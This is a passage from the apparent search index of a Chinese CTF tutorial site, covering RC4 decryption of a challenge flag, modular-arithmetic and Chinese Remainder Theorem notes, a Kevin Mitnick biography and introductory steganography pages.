_ in range(plaintext_length):\n    i = (i + 1) % 256\n    j = (j + s[i]) % 256\n    s[i], s[j] = s[j], s[i]  # \u7ee7\u7eed\u4ea4\u6362\n    k = s[(s[i] + s[j]) % 256]\n    key_stream.append(k)  # \u751f\u6210\u5bc6\u94a5\u6d41\u5b57\u8282\n</code></pre> <ol> <li>\u52a0\u5bc6/\u89e3\u5bc6\u64cd\u4f5c</li> </ol> <pre><code>ciphertext = []\nfor p, k in zip(plaintext, key_stream):\n    ciphertext.append(p ^ k)  # \u5f02\u6216\u8fd0\u7b97\n</code></pre> <p>\u7b97\u6cd5\u56fe\u793a\uff1a</p> <pre><code>+-------------------+    +-------------------+\n|     \u5bc6\u94a5K          |    |     \u660e\u6587P         |\n+-------------------+    +-------------------+\n        |                        |\n        v                        v\n+-------------------+    +-------------------+\n|     KSA\u7b97\u6cd5        |    |     PRGA\u7b97\u6cd5       |\n| (\u521d\u59cb\u5316S\u76d2)        |    | (\u751f\u6210\u5bc6\u94a5\u6d41)       |\n+-------------------+    +-------------------+\n        |                        |\n        v                        v\n+-------------------+    +-------------------+\n| \u521d\u59cb\u5316\u540e\u7684S\u76d2      |---&gt;| \u5bc6\u94a5\u6d41KS           |\n+-------------------+    +-------------------+\n                                 |\n                                 v\n                          +-------------------+\n                          | P XOR KS = C      |\n                          | (\u52a0\u5bc6/\u89e3\u5bc6)       |\n                          +-------------------+\n                                 |\n                                 v\n                          +-------------------+\n                          | \u5bc6\u6587C/\u660e\u6587P       |\n                          +-------------------+\n</code></pre> <p>\u4e0b\u8f7d\u9644\u4ef6\u5148\u770b\u52a0\u5bc6\u7684\u4f2a\u4ee3\u7801\u4ee3\u7801</p> <pre><code>get buf unsign s[256]\n\nget buf t[256]\n\nwe have key:hello world\n\nwe have flag:????????????????????????????????\n\n\nfor i:0 to 256\n\nset s[i]:i\n\nfor i:0 to 256\n    set t[i]:key[(i)mod(key.lenth)]\n\nfor i:0 to 256\n    set j:(j+s[i]+t[i])mod(256)\n        swap:s[i],s[j]\n\nfor m:0 to 37\n    set i:(i + 1)mod(256)\n    set j:(j + S[i])mod(256)\n    swap:s[i],s[j]\n    set x:(s[i] + (s[j]mod(256))mod(256))\n    set flag[m]:flag[m]^s[x]\n\nfprint flagx to file\n</code></pre> <p>\u53ef\u4ee5\u76f4\u63a5\u590d\u5236 16 \u8fdb\u5236\u53bb\u5728\u7ebf\u7f51\u7ad9\u89e3\u5bc6</p> <p></p> <p>\u7f51\u5740</p> <p></p> <p>\u7531\u4e8e RC4 \u662f\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u590d\u73b0\u4e00\u904d\u76f8\u540c\u7b97\u6cd5\u5e76\u4f5c\u7528\u5728\u5bc6\u6587\u4e0a\u5373\u53ef\u5f97\u51fa\u660e\u6587</p> <p>\u7f16\u5199\u811a\u672c\u89e3\u5bc6\uff1a</p> <pre><code>s = list(range(256))\nt = []\nkey = \"hello world\"\n\nfor i in range(256):\n    t.append(key[i % len(key)]) # fill t with key (by circle\n\nprint(t)\n\nj = 0\nfor i in range(256):\n    j = (j + s[i] + ord(t[i])) % 256\n    s[i], s[j] = s[j], s[i]\nprint(s)\n\nc = open(\"enc.txt\",\"rb\").read()\ni = 0\nj = 0\nflag = \"\"\nfor ci in c:\n    i = (i + 1) % 256\n    j = (j + s[i]) % 256\n    s[i], s[j] = s[j], s[i]\n    x = (s[i] + (s[j] % 256)) % 256\n    flag += chr(ci ^ s[x])\n\nprint(flag)\n</code></pre>"},{"location":"Crypto/Chapter99/99-1/","title":"\u6a21\u8fd0\u7b97","text":""},{"location":"Crypto/Chapter99/99-1/#\u6a21\u8fd0\u7b97","title":"\u6a21\u8fd0\u7b97","text":"<p>\u540c\u4f59\u5b9a\u4e49\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;a\\ \\equiv\\ b\\ (mod\\ m)\\ \u27fa\\ m\\ |\\ (a\\ -\\ b)\n\\end{aligned}\n$$\n</code></pre> \u5373 \ud835\udc4e \u4e0e \ud835\udc4f \u9664\u4ee5 \ud835\udc5a \u4f59\u6570\u76f8\u540c\uff0c\u540e\u9762\u7684\u5219\u662f m \u6574\u9664 (a \u2212 b) <pre><code>\n</code></pre> \u6027\u8d28\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;a\\ \\equiv\\ b\\ (mod\\ m)\\ \u21d2\\ a\\ +\\ c\\ \\equiv\\ b\\ +\\ c\\ (mod\\ m)\\\\\\\\\n&amp;a\\ \\equiv\\ b\\ (mod\\ m)\\ \u21d2\\ a\\ *\\ c\\ \\equiv\\ b\\ *\\ c\\ (mod\\ m)\\\\\\\\\n&amp;a\\ \\equiv\\ b\\ (mod\\ m)\\ \u21d2\\ a^k\\ \\equiv\\ b^k\\ (mod\\ m)\\\\\\\\\n\\end{aligned}\n$$\n</code></pre> \u5df2\u77e5 17 \u2261 5(mod 12)\uff0c\u5219\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;17\\ +\\ 3\\ =\\ 20,\\ 5\\ +\\ 3\\ =\\ 8\\ \u21d2\\ 20\\ \\equiv\\ 8\\ (mod\\ 12)\n\\end{aligned}\n$$\n</code></pre> \u5df2\u77e5 1 7\u2261 5(mod 12)\uff0c\u4e58\u4ee5 4\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;17\\ *\\ 4\\ =\\ 68,\\ 5\\ *\\ 4\\ =\\ 20\\ \u21d2\\ 68\\ \\equiv\\ 20\\ (mod\\ 12)\n\\end{aligned}\n$$\n</code></pre> \u5df2\u77e5 1 7\u2261 5(mod 12)\uff0c\u5e73\u65b9\u540e\uff1a ```</p> \\[ \\begin{aligned} &amp;17^2\\ =\\ 289,\\ 5^2\\ =\\ 25\\ \u21d2\\ 289\\ \\equiv\\ 25\\ (mod\\ 12) \\end{aligned} \\]"},{"location":"Crypto/Chapter99/99-2/","title":"\u7ebf\u6027\u540c\u4f59\u65b9\u7a0b","text":""},{"location":"Crypto/Chapter99/99-2/#\u7ebf\u6027\u540c\u4f59\u65b9\u7a0b","title":"\u7ebf\u6027\u540c\u4f59\u65b9\u7a0b","text":"<p>\u57fa\u672c\u5f62\u5f0f\u4e3a\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;ax\\ \\equiv\\ b\\ (mod\\ m)\n\\end{aligned}\n$$\n</code></pre> \u5148\u6c42 gcd(a,m) \u82e5 gcd(a,m) \u2224 b\uff0c\u5219\u65e0\u89e3 \u82e5 d = gcd(a,m) \u4e14 d | b\uff0c\u5219\u5c06\u65b9\u7a0b\u7b80\u5316\u4e3a\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;\\frac{a}{d}x\\ \\equiv\\ \\frac{b}{d}\\ (mod\\ \\frac{m}{d})\n\\end{aligned}\n$$\n</code></pre> \u6c42\u51fa\u4e00\u4e2a\u89e3\u540e\uff0c\u5176\u4ed6\u89e3\u4e3a\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;x\\ \\equiv\\ x_0\\ +\\ \\frac{m}{d}k\\ (k\\ \\epsilon\\ Z)\n\\end{aligned}\n$$\n</code></pre> \u4f8b\uff1a\u89e3\u7ebf\u6027\u540c\u4f59\u65b9\u7a0b <pre><code>$$\n\\begin{aligned}\n&amp;12x\\ \\equiv\\ 8\\ (mod\\ 20)\n\\end{aligned}\n$$\n</code></pre> Step 1\uff1a\u8ba1\u7b97\u6700\u5927\u516c\u7ea6\u6570 <pre><code>$$\n\\begin{aligned}\n&amp;gcd(12,20)\\ =\\ 4\n\\end{aligned}\n$$\n</code></pre> \u56e0\u4e3a 4\u22238\uff0c\u6240\u4ee5\u6709\u89e3</p> <p>Step 2\uff1a\u4e24\u8fb9\u540c\u65f6\u9664\u4ee5 4\uff0c\u5316\u7b80\u65b9\u7a0b <pre><code>$$\n\\begin{aligned}\n&amp;\\frac{12}{4}x\\ \\equiv\\ \\frac{8}{4}\\ (mod\\ \\frac{20}{4})\\ \u21d2\\ 3x\\ \\equiv\\ 2\\ (mod\\ 5)\n\\end{aligned}\n$$\n</code></pre> Step 3\uff1a\u6c42\u7279\u89e3</p> <p>\u6211\u4eec\u8981\u6c42\u6ee1\u8db3\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;3x\\ \\equiv\\ 2\\ (mod\\ 5)\n\\end{aligned}\n$$\n</code></pre> \u6240\u4ee5\u7279\u89e3\u4e3a\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;x_0\\ =\\ 4\n\\end{aligned}\n$$\n</code></pre> Step 4\uff1a\u5199\u51fa\u901a\u89e3</p> <p>\u56e0\u4e3a\u539f\u6765 d = 4\uff0c\u6240\u4ee5\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;x\\ \\equiv\\ 4\\ +\\ 5k\\ (k\\ \\epsilon\\ Z)\n\\end{aligned}\n$$\n</code></pre> \u8fd9\u8868\u793a\u6709 4 \u4e2a\u4e0d\u540c\u7684\u6a21 20 \u7684\u89e3\uff0c\u56e0\u4e3a\u6bcf\u6b21\u95f4\u9694\u4e3a m/d = 5\uff0c\u6700\u591a\u91cd\u590d d = 4 \u6b21</p> <p>\u6700\u7ec8\u89e3\uff1ax = 4,9,14,19 (mod 20) ```</p>"},{"location":"Crypto/Chapter99/99-3/","title":"\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\uff08GCD\uff09","text":""},{"location":"Crypto/Chapter99/99-3/#\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5gcd","title":"\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\uff08GCD\uff09","text":"<pre><code>gcd(a, b) = gcd(b, a % b)\n</code></pre> <p>\u4f8b\u5982\uff1agcd(48, 18) \u2192 gcd(18, 12) \u2192 gcd(12, 6) \u2192 gcd(6, 0) = 6</p>"},{"location":"Crypto/Chapter99/99-4/","title":"\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5-\u8d1d\u7956\u5b9a\u7406","text":""},{"location":"Crypto/Chapter99/99-4/#\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5-\u8d1d\u7956\u5b9a\u7406","title":"\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5-\u8d1d\u7956\u5b9a\u7406","text":"<p>\u5f53\u4e24\u4e2a\u6574\u6570 e1 \u548c e2 \u4e92\u7d20\u65f6\uff0c\u6839\u636e\u8d1d\u7ec4\u5b9a\u7406\uff0c\u5fc5\u5b9a\u5b58\u5728\u6574\u6570 a\u3001b\uff0c\u4f7f\u5f97 <pre><code>$$\n\\begin{aligned}\n&amp;a\\ *\\ e_1\\ +\\ b\\ *\\ e_2\\ =\\ 1\n\\end{aligned}\n$$\n</code></pre> \u8fd9\u4e5f\u610f\u5473\u7740 ```</p> \\[ \\begin{aligned} &amp;a\\ *\\ e_1\\ \\equiv\\ 1\\ (mod\\ e_2) \\end{aligned} \\]"},{"location":"Crypto/Chapter99/99-5/","title":"\u6574\u6570\u7ebf\u6027\u7ec4\u5408","text":""},{"location":"Crypto/Chapter99/99-5/#\u6574\u6570\u7ebf\u6027\u7ec4\u5408","title":"\u6574\u6570\u7ebf\u6027\u7ec4\u5408","text":"<p>\u6307\u7684\u662f\u7528\u6574\u6570\u7cfb\u6570 x,y \u8868\u793a a,b \u7684\u7ebf\u6027\u7ec4\u5408\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;a\\ *\\ x\\ +\\ b\\ *\\ y\\ =\\ d\\ =\\ gcd(a,b)\n\\end{aligned}\n$$\n</code></pre> \u8fd9\u4e2a\u6982\u5ff5\u5728\u6c42\u6a21\u9006\u5143\u3001\u89e3\u7ebf\u6027\u540c\u4f59\u65b9\u7a0b\u65f6\u81f3\u5173\u91cd\u8981</p> <p>\u793a\u4f8b\uff1a\u5199\u51fa 48 \u548c 18 \u7684\u6700\u5927\u516c\u7ea6\u6570\u7684\u6574\u6570\u7ebf\u6027\u7ec4\u5408</p> <p>Step 1\uff1a\u5148\u7528\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42 gcd(48,18) = 6</p> <p>Step 2\uff1a\u56de\u4ee3\u6c42\u51fa\u6574\u6570 x,y <pre><code>$$\n\\begin{aligned}\n&amp;6\\ =\\ 18\\ -\\ 1\\ *\\ 12\\\\\n&amp;=\\ 18\\ -\\ 1\\ \\ *\\ (48\\ -\\ 2\\ *\\ 18)\\\\\n&amp;=\\ 18\\ -\\ 1\\ \\ *\\ 48\\ +\\ 2\\ *\\ 18\\\\\n&amp;=\\ 3\\ *\\ 18\\ -\\ 1\\ *\\ 48\\\\\n\\end{aligned}\n$$\n</code></pre> \u6240\u4ee5\u6211\u4eec\u5f97\u5230\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;6\\ =\\ (-1)\\ *\\ 48\\ +\\ 3\\ *\\ 18\\\\\n\\end{aligned}\n$$\n</code></pre> \u5373 48x + 18y = 6\uff0c\u5176\u4e2d x = -1\uff0cy = 3 ```</p>"},{"location":"Crypto/Chapter99/99-6/","title":"\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff08CRT\uff09","text":""},{"location":"Crypto/Chapter99/99-6/#\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406crt","title":"\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff08CRT\uff09","text":"<p>\u5b9a\u7406\u5185\u5bb9\uff0c\u8bbe\uff1a     m1,m2,\u2026\u2026,mk \u4e24\u4e24\u4e92\u7d20\uff08\u5373 gcd(mi,mj)=1, i \u4e0d\u7b49\u4e8e j\uff09     a1,a2,\u2026\u2026,ak \u662f\u4efb\u610f\u6574\u6570</p> <p>\u8003\u8651\u7ebf\u6027\u540c\u4f59\u65b9\u7a0b\u7ec4\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;\\begin{cases}\\ x\\ \\equiv\\ a_1\\ (mod\\ m_1)\\\\\\  x\\ \\equiv\\ a_2\\ (mod\\ m_2)\\\\\\  x\\ \\equiv\\ a_3\\ (mod\\ m_3)\\end{cases}\n\\end{aligned}\n$$\n</code></pre> \u90a3\u4e48\u8fd9\u4e2a\u65b9\u7a0b\u7ec4\u6709\u552f\u4e00\u89e3 <pre><code>$$\n\\begin{aligned}\n&amp;x\\ mod\\ M\\\\\\\\\n&amp;M\\ =\\ m_1m_2\u2026\u2026m_3\n\\end{aligned}\n$$\n</code></pre> \u6784\u9020\u901a\u89e3\uff0c\u6211\u4eec\u8981\u627e\u51fa\u4e00\u4e2a\u6574\u6570 \ud835\udc65\uff0c\u4f7f\u5f97\u5b83\u540c\u65f6\u6ee1\u8db3\u6240\u6709\u540c\u4f59\u6761\u4ef6</p> <p>\u6211\u4eec\u6784\u9020\u4e00\u4e2a\u516c\u5f0f\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;x\\ \\equiv\\ \\sum_{i=1}^{k}{a_i\\ *\\ M_i\\ *\\ y_i}\\ (mod\\ N)\\\\\\\\\n&amp;M\\ =\\ m_1m_2\u2026\u2026m_k\\\\\n&amp;M_i\\ =\\frac{M}{m_i}\\\\\n&amp;y_i\\ ={M_i}^{-1}\\ (mod\\ m_i)(\u5373\\ M_i\\ *\\ y_i\\ \\equiv\\ 1\\ (mod\\ m_i))\\\\\n\\end{aligned}\n$$\n</code></pre> \u6837\u9898\uff0c\u6c42\u89e3\u65b9\u7a0b\u7ec4 <pre><code>$$\n\\begin{aligned}\n&amp;\\begin{cases}\\ x\\ \\equiv\\ 2\\ (mod\\ 3)\\\\\\  x\\ \\equiv\\ 3\\ (mod\\ 5)\\\\\\  x\\ \\equiv\\ 2\\ (mod\\ 7)\\end{cases}\n\\end{aligned}\n$$\n</code></pre> \u9996\u5148\u8ba1\u7b97 M <pre><code>$$\n\\begin{aligned}\n&amp;M\\ =\\ 3\\ *\\ 5\\ *\\ 7\\ =\\ 105\n\\end{aligned}\n$$\n</code></pre> \u8ba1\u7b97\u6bcf\u4e2a Mi <pre><code>| i    | m_i  | a_i  | M_i = M/m_i  | y_i = M_i^{-1} mod m_i                       |\n| ---- | ---- | ---- | ------------ | -------------------------------------------- |\n| 1    | 3    | 2    | 105 / 3 = 35 | 35 mod 3 \u7684\u9006\u5143\u662f 2\uff08\u56e0\u4e3a 35 \u22c5 2 \u2261 1mod\u2009\u20093\uff09 |\n| 2    | 5    | 3    | 105 / 5 = 21 | 21 mod 5 \u7684\u9006\u5143\u662f 1\uff0821 \u22c5 1 \u2261 1mod\u2009\u20095\uff09      |\n| 3    | 7    | 2    | 105 / 7 = 15 | 15 mod 7 \u7684\u9006\u5143\u662f 1\uff0815 \u22c5 1 \u2261 1mod\u2009\u20097\uff09      |\n</code></pre> \u4ee3\u5165\u516c\u5f0f <pre><code>$$\n\\begin{aligned}\n&amp;x\\ \\equiv\\ 2\\ *\\ 35\\ *\\ 2\\ +\\ 3\\ *\\ 21\\ *\\ 1\\ +\\ 2\\ *\\ 15\\ *\\ 1\\ (mod\\ 105)\\\\\\\\\n&amp;x\\ \\equiv\\ 2\\ *\\ 70\\ +\\ 3\\ *\\ 21\\ +\\ 2\\ *\\ 15\\ =\\ 140\\ +\\ 63\\ +\\ 30\\ =\\ 233\n\\end{aligned}\n$$\n</code></pre> \u6c42\u6a21 <pre><code>$$\n\\begin{aligned}\n&amp;x\\ \\equiv\\ 233\\ (mod\\ 105)\\ =\\ 233\\ -\\ 2\\ *\\ 105\\ =\\ 23\\\\\\\\\n\\end{aligned}\n$$\n</code></pre> \u6240\u4ee5\u6700\u7ec8\u89e3 ```</p> \\[ \\begin{aligned} &amp;x\\ \\equiv\\ 23\\ (mod\\ 105)\\\\\\\\ \\end{aligned} \\]"},{"location":"Crypto/Chapter99/99-7/","title":"\u540c\u4f59\u65b9\u7a0b\u7ec4\u7684\u5408\u5e76\uff08\u975e\u4e92\u8d28\u60c5\u51b5\uff09","text":""},{"location":"Crypto/Chapter99/99-7/#\u540c\u4f59\u65b9\u7a0b\u7ec4\u7684\u5408\u5e76\u975e\u4e92\u8d28\u60c5\u51b5","title":"\u540c\u4f59\u65b9\u7a0b\u7ec4\u7684\u5408\u5e76\uff08\u975e\u4e92\u8d28\u60c5\u51b5\uff09","text":"<p>\u5f53\u6a21\u6570\u4e0d\u4e92\u8d28\u65f6\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;\\begin{cases}\\ x\\ \\equiv\\ a_1\\ (mod\\ m_1)\\\\\\  x\\ \\equiv\\ a_2\\ (mod\\ m_2)\\end{cases}\n\\end{aligned}\n$$\n</code></pre> \u6b65\u9aa4\u5982\u4e0b\uff1a     1. \u6c42 d = gcd(m1,m2)     2. \u5224\u65ad\u662f\u5426\u6709\u89e3         2.1 \u82e5 d | (a2 - a1)\uff0c\u5219\u6709\u89e3         2.2 \u5426\u5219\u65e0\u89e3     3. \u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u89e3\uff1a         m1 * x + m2 * y = a2 - a1         \u5f97\u5230\u901a\u89e3 x = x0     4. \u5c06\u4e24\u4e2a\u65b9\u7a0b\u5408\u5e76\u4e3a\u4e00\u4e2a\u65b0\u7684\u540c\u4f59\u5f0f\uff0c\u518d\u7ee7\u7eed\u5408\u5e76\u7b2c\u4e09\u4e2a\u2026\u2026 ```</p>"},{"location":"Crypto/Chapter99/99-8/","title":"\u6a21\u6570\u7684\u7b49\u6548\u6027","text":""},{"location":"Crypto/Chapter99/99-8/#\u6a21\u6570\u7684\u7b49\u6548\u6027","title":"\u6a21\u6570\u7684\u7b49\u6548\u6027","text":"<p>\u6a21\u6570 MOD = 62\uff0c\u8fd9\u5c31\u597d\u6bd4\u4e00\u4e2a\u53ea\u6709 62 \u4e2a\u523b\u5ea6\u7684\u65f6\u949f</p> <p>\u5982\u679c\u4f60\u8f6c\u4e86 1 \u5708\uff0862\u683c\uff09\uff0c\u6307\u9488\u56de\u5230\u539f\u70b9\uff080\uff09</p> <p>\u5982\u679c\u4f60\u8f6c\u4e86 65 \u683c\uff0c\u6307\u9488\u505c\u5728 3 \u7684\u4f4d\u7f6e\u3002\u6240\u4ee5\u5728\u6a21 62 \u7684\u4e16\u754c\u91cc\uff0c65 \u548c 3 \u662f\u5b8c\u5168\u7b49\u4ef7\u7684</p>"},{"location":"Crypto/Chapter99/99-9/","title":"\u6590\u6ce2\u90a3\u5951\u6570\u5217","text":""},{"location":"Crypto/Chapter99/99-9/#\u6590\u6ce2\u90a3\u5951\u6570\u5217","title":"\u6590\u6ce2\u90a3\u5951\u6570\u5217","text":"<p>$$ \\begin{aligned} &amp;F_n = F_{n-1} + F_{n-2} (n \\geq 3) \\end{aligned} $$ \u5728 CTF \u548c\u6570\u8bba\u9886\u57df\uff0c\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684**\u6a21\u8fd0\u7b97\u6027\u8d28**\u81f3\u5173\u91cd\u8981\uff1a</p> <p>Pisano \u5468\u671f</p> <ul> <li>\u5b9a\u4e49\uff1a \u6590\u6ce2\u90a3\u5951\u6570\u5217\u5bf9\u4efb\u4f55\u6b63\u6574\u6570 n \u53d6\u6a21\u540e\uff0c\u90fd\u4f1a\u53d8\u6210\u4e00\u4e2a**\u5faa\u73af\u6570\u5217**\u3002\u8fd9\u4e2a\u5faa\u73af\u7684\u957f\u5ea6\u5c31\u88ab\u79f0\u4e3a Pisano \u5468\u671f\uff0c\u8bb0\u4f5c   $$   \\begin{aligned}   &amp;\\pi(n)   \\end{aligned}   $$</li> </ul> <p>\u9ec4\u91d1\u6bd4\u4f8b</p> <p>\u6590\u6ce2\u90a3\u5951\u6570\u5217\u6700\u8457\u540d\u7684\u6027\u8d28\u662f\u5b83\u4e0e**\u9ec4\u91d1\u6bd4\u4f8b** \u7684\u5173\u7cfb</p> <ul> <li> <p>\u9ec4\u91d1\u6bd4\u4f8b\u7684\u503c\uff1a   $$   \\begin{aligned}   &amp;\\phi = \\frac{1 + \\sqrt{5}}{2} \\approx 1.6180339887\\dots   \\end{aligned}   $$</p> </li> <li> <p>\u6536\u655b\u6027\uff1a \u5f53 n \u8d8b\u8fd1\u4e8e\u65e0\u7a77\u5927\u65f6\uff0c\u76f8\u90bb\u4e24\u9879\u7684\u6bd4\u503c   $$   \\begin{aligned}   (\\frac{F_{n}}{F_{n-1}})   \\end{aligned}   $$   \u4f1a\u65e0\u9650\u63a5\u8fd1\u9ec4\u91d1\u6bd4\u4f8b</p> </li> </ul> <p>\u5bbe\u6d85\u516c\u5f0f</p> <p>\u6590\u6ce2\u90a3\u5951\u6570\u5217\u5b58\u5728\u4e00\u4e2a\u4e0d\u4f9d\u8d56\u4e8e\u524d\u4e00\u9879\u7684\u5c01\u95ed\u5f62\u5f0f\u516c\u5f0f\uff0c\u53ef\u4ee5\u76f4\u63a5\u8ba1\u7b97\u7b2c n \u9879\uff1a $$ \\begin{aligned} F_n = \\frac{\\phi^n - (-\\phi)^{-n}}{\\sqrt{5}} \\end{aligned} $$ \u5362\u5361\u65af\u6052\u7b49\u5f0f</p> <p>\u6b63\u5982\u6211\u4eec\u5728\u4e0a\u4e00\u9898\u4e2d\u8ba8\u8bba\u7684\uff0c\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684\u548c\u4e5f\u6709\u7b80\u6d01\u7684\u516c\u5f0f\uff1a $$ \\begin{aligned} \\sum_{i=1}^{n} F_i = F_{n+2} - 1 \\end{aligned} $$</p>"},{"location":"Misc/","title":"\u4ecb\u7ecd","text":"<p>\u5728CTF\uff08Capture The Flag\uff09\u7ade\u8d5b\u4e2d\uff0cMisc\uff08\u6742\u9879\uff09\u662f\u4e00\u4e2a\u5305\u7f57\u4e07\u8c61\u7684\u7c7b\u522b\u3002\u5b83\u4ee5\u201c\u8111\u6d1e\u5927\u201d\u201c\u6280\u5de7\u591a\u201d\u8457\u79f0\uff0c\u8981\u6c42\u9009\u624b\u5177\u5907\u5e7f\u535a\u7684\u77e5\u8bc6\u50a8\u5907\u548c\u654f\u9510\u7684\u89c2\u5bdf\u529b\u3002 \u4f5c\u8005\u6b63\u5728\u7f16\u5199\u4e2d</p>"},{"location":"Misc/Chapter1/","title":"Index","text":""},{"location":"Misc/Chapter1/#kevin-mitnick","title":"Kevin Mitnick","text":"<p>\u7f8e\u56fd\u4eba Kevin Mitnick \u582a\u79f0\u9ed1\u5ba2\u9f3b\u7956\uff0c\u4ed6\u7684\u9ed1\u5ba2\u751f\u6daf\u59cb\u4e8e\u5c11\u5e74\u65f6\u671f\u3002</p> <p>1979 \u5e74\uff0c\u4fb5\u5165\u4e86 DEC \u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u5e76\u590d\u5236\u4e86\u8be5\u516c\u53f8\u7684\u8f6f\u4ef6\u5e76\u4e8e 1988 \u5e74\u56e0\u8fd9\u4e00\u7f6a\u884c\u88ab\u6307\u63a7\u5e76\u5b9a\u7f6a\u3002\u4ed6\u88ab\u5224\u5904 12 \u4e2a\u6708\u76d1\u7981\uff0c\u968f\u540e\u63a5\u53d7\u4e09\u5e74\u7684\u76d1\u5916\u770b\u7ba1</p> <p>\u76d1\u5916\u770b\u7ba1\u671f\u5373\u5c06\u7ed3\u675f\u4e4b\u9645\uff0cKevin Mitnick \u5165\u4fb5\u4e86\u592a\u5e73\u6d0b\u8d1d\u5c14\u8bed\u97f3\u4fe1\u7bb1\u8ba1\u7b97\u673a\u3002\u5728\u902e\u6355\u4ee4\u53d1\u51fa\u540e\uff0c\u7c73\u7279\u5c3c\u514b\u6f5c\u9003\uff0c\u5728\u9003\u4ea1\u4e86\u4e24\u5e74\u534a</p> <p>\u5728\u9003\u671f\u95f4\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u4e86\u6570\u5341\u4e2a\u8ba1\u7b97\u673a\u7f51\u7edc\uff0c\u4ed6\u4f7f\u7528\u514b\u9686\u7684\u624b\u673a\u9690\u85cf\u81ea\u5df1\u7684\u4f4d\u7f6e</p> <p>\u5728\u4ed6\u7684\u76d1\u7763\u91ca\u653e\u671f\u95f4\uff0c\u4ed6\u6700\u521d\u88ab\u7981\u6b62\u4f7f\u7528\u9664\u56fa\u5b9a\u7535\u8bdd\u4e4b\u5916\u7684\u4efb\u4f55\u901a\u8baf\u6280\u672f</p> <p>2000 \u5e74\u83b7\u91ca\u540e\uff0c\u7c73\u7279\u5c3c\u514b\u6210\u4e3a\u4e00\u540d\u6709\u507f\u5b89\u5168\u987e\u95ee\u3001\u516c\u4f17\u6f14\u8bb2\u8005\u548c\u4f5c\u5bb6\u3002\u4ed6\u4e3a\u516c\u53f8\u548c\u653f\u5e9c\u673a\u6784\u63d0\u4f9b\u5b89\u5168\u54a8\u8be2\u3001\u6e17\u900f\u6d4b\u8bd5\u670d\u52a1\u5e76\u6559\u6388\u793e\u4f1a\u5de5\u7a0b\u5b66\u8bfe\u7a0b</p> <p>Kevin Mitnick \u4e8e 2023 \u5e74 7 \u6708 16 \u65e5\u5728\u5bbe\u5915\u6cd5\u5c3c\u4e9a\u5dde\u5339\u5179\u5821\u4e00\u5bb6\u533b\u9662\u56e0\u80f0\u817a\u764c\u53bb\u4e16</p> <p></p>"},{"location":"Misc/Chapter1/1-1/","title":"\u6587\u4ef6\u5185\u5bb9\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-1/#\u6587\u4ef6\u5185\u5bb9\u9690\u5199","title":"\u6587\u4ef6\u5185\u5bb9\u9690\u5199","text":"<p>\u8fd9\u7c7b\u9898\u7b97\u662f\u6bd4\u8d5b\u7684\u7b7e\u5230\u9898</p> <p>\u6bd4\u8d5b\u65b9\u53ef\u80fd\u4f1a\u7ed9\u4f60\u5404\u79cd\u5404\u6837\u7684\u6587\u4ef6</p> <p>\u4f60\u9700\u8981\u5c06\u6587\u4ef6\u7528\u8bb0\u4e8b\u672c\u6253\u5f00</p> <p>\u8fd9\u540c\u6837\u4e5f\u662f\u5f88\u591a\u590d\u6742\u9898\u7684\u7b2c\u4e00\u6b65</p> <p>\u4ece\u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u6570\u636e\u4e2d\u627e\u51fa\u7ebf\u7d22</p> <p>\u8bdd\u4e0d\u591a\u8bf4\uff0c\u76f4\u63a5\u4e0a\u9898\uff08BugKu CTF\uff09</p> <p></p> <p>\u4e0b\u8f7d\u6587\u4ef6\u540e\u7528 txt \u5f62\u5f0f\u6253\u5f00\uff08\u63a8\u8350 VS Code\uff09</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter1/1-10/","title":"\u5b57\u9891\u7edf\u8ba1\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-10/#\u5b57\u9891\u7edf\u8ba1\u9690\u5199","title":"\u5b57\u9891\u7edf\u8ba1\u9690\u5199","text":"<p>\u524d\u9762\u6b65\u9aa4\u662f ForeMost \u5206\u79bb\u52a0\u89e3\u538b\u5bc6\u7801\u7206\u7834</p> <p>\u7206\u7834\u540e\u62ff\u5230\u4e00\u4e2a txt \u5305\u542b\u5927\u91cf\u65e0\u7279\u5f81\u3001\u65e0\u89c4\u5f8b\u7684\u91cd\u590d\u5b57\u7b26</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u62ff\u5230 flag</p> <pre><code>import re\nfrom collections import Counter\n\ndef count_letters(filename):\n    \"\"\"\u8ba1\u7b97\u5e76\u8fd4\u56de\u6587\u4ef6\u4e2d\u6bcf\u4e2a\u5b57\u6bcd\u7684\u51fa\u73b0\u6b21\u6570\"\"\"\n    try:\n        with open(filename, 'r', encoding='utf-8') as file:\n            # \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u8f6c\u6362\u4e3a\u5c0f\u5199\n            text = file.read().lower()\n\n            # 